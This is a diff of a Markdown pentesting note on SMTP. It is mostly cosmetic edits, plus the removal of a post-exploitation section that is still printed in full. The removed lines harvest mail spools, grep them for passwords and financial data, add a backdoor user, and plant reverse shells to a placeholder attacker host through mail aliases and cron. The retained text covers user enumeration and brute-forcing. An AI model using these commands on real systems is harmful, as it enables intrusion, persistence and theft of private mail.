@@ -1,5 +1,6 @@
 ---
 created: 2026-04-03
+color: "linear-gradient(45deg, #23d4fd 0%, #3a98f0 50%, #b721ff 100%)"
 ---
 ## SMTP
 
@@ -317,7 +318,7 @@ sudo nmap <target> -p 25,465,587 --script smtp*
 
 - Key SMTP scripts:
 
-| Script                                                                                  | Tags                                 | Description                                                                                                                                                                                                                                                                      |
+| Script                                                                                  | Categories                           | Description                                                                                                                                                                                                                                                                      |
 | --------------------------------------------------------------------------------------- | ------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | [`smtp-commands`](https://nmap.org/nsedoc/scripts/smtp-commands.html)                   | `default`, `discovery`, `safe`       | Attempts to use `EHLO` and `HELP` to gather the Extended commands supported by an SMTP server.                                                                                                                                                                                   |
 | [`smtp-enum-users`](https://nmap.org/nsedoc/scripts/smtp-enum-users.html)               | `auth`, `external`, `intrusive`      | Attempts to enumerate users on an SMTP server by issuing the `VRFY`, `EXPN`, or `RCPT TO` commands.                                                                                                                                                                              |
@@ -432,9 +433,9 @@ nmap --script smtp-enum-users \
 <target>
 ```
 
-## Brute-forcing SMTP
+## Brute-forcing credentials
 
-Once you have a valid username list, you can brute-force passwords:
+Once you have a valid username list, you can brute-force SMTP passwords:
 
 - Medusa: 
 
@@ -477,6 +478,8 @@ nmap -p 25 --script smtp-brute \
 ```
 
 >[!note] SMTP servers commonly rate-limit or temporarily block IP addresses after repeated failed authentication attempts. Start with `-t 3` or `-t 5` in Hydra and adjust. Watch for `421 Too many connections` or `535 Authentication failed` becoming increasingly delayed — these indicate rate-limiting.
+
+>[!note] See [[Password wordlists and default credentials]].
 ## Sending emails from the command-line
 
 ### swaks 
@@ -562,75 +565,6 @@ sendemail -f user@target.com \
           -xu user@target.com \
           -xp 'passwd'
 ```
-
-## Post-exploitation
-
-Email harvesing
-
-
-```bash
-# If you have access to mail server
-
-# Read mail spool
-cat /var/mail/username
-cat /var/spool/mail/username
-
-# Maildir format
-ls -la /home/username/Maildir/cur/
-cat /home/username/Maildir/cur/*
-
-# Extract email addresses
-grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' /var/mail/*
-
-```
-
-
-- mail queue manipulation
-
-```bash
-# View mail queue
-mailq
-
-# Read queued messages
-postcat -q QUEUE_ID
-
-# Flush mail queue
-postfix flush
-
-# Delete from queue
-postsuper -d QUEUE_ID
-postsuper -d ALL
-```
-
-- data exfiltration
-
-```bash
-# Search for sensitive keywords
-grep -r -i "password\|secret\|confidential" /var/mail/
-
-# Extract attachments
-find /var/mail/ -name "*.pdf" -o -name "*.doc" -o -name "*.xls"
-
-# Extract financial information
-grep -r -i "account\|routing\|ssn\|credit" /var/mail/
-```
-
-- persistence 
-
-```bash
-# Modify mail server configuration
-# Add backdoor user to mail system
-useradd -m -s /bin/bash backdoor
-echo "backdoor:password" | chpasswd
-
-# Modify mail aliases
-echo "backdoor: |/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'" >> /etc/aliases
-newaliases
-
-# Create cron job for persistence
-echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'" | crontab -
-```
-
 ## References and further reading
 
 - [`Simple Mail Transfer Protocol — Wikipedia`](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol)
